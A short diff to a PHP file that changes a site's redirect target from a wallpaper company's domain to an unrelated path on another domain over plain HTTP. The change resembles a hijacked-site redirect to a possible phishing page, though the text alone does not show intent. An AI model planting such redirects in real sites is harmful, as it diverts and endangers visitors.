@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.seabrookwallpaper.com");
+header("Location: http://boosterinterior.us/nort/index.html");
 die();
 ?>
